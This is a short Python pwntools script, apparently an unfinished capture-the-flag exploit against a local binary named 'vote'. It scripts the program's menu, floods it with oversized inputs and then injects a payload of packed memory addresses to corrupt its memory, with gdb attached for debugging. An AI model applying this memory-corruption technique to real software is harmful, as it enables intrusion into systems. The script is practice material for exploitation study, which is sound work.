from pwn import *

r = process("./vote", env = {"LD_PRELOAD":"./libc.so.6"})

def vote(employed, age, gender, state, candidate):
    r.sendline('5')
    print r.recvuntil("?")
    r.sendline(str(employed))
    print r.recvuntil("?")
    r.sendline(str(age))
    print r.recvuntil("?")
    r.sendline(str(gender))
    print r.recvuntil("?")
    r.sendline(str(state))
    print r.recvuntil("?")
    r.sendline(str(candidate))
    print r.recvuntil("vote ID is ")
    s = r.recvline()[:-2]
    print r.recvuntil("> ")
    return s

def change_gender(voter, gender):
    r.sendline('4')
    print r.recvuntil("ID: ")
    r.sendline(voter)
    print r.recvuntil("?")
    r.sendline(gender)
    print r.recvuntil("> ")

def delete(voter):
    r.sendline('3')
    print r.recvuntil("ID: ")
    r.sendline(voter)
    print r.recvuntil("> ")

def stats():
    r.sendline('2')
    print r.recvuntil("> ")

def results():
    r.sendline('1')
    print r.recvuntil("> ")

print r.recvuntil("> ")

voters = []
for x in range(50):
    voters.append(vote(1, 1, 'a'*100, 'a'*100, 'a'*100))
gdb.attach(r)
voters.append(vote(1, 1, (p64(0x1337) + p64(0x40f000) + p64(0x40f004) + p64(0x40f003)+ p64(0x40f002)+ p64(0x40f001) + "A" * 0x18 + p64(0x40f003)).ljust(100, 'a'), 'b'*100, 'c'*100))

#change_gender(voters[1], 'A')

r.interactive()
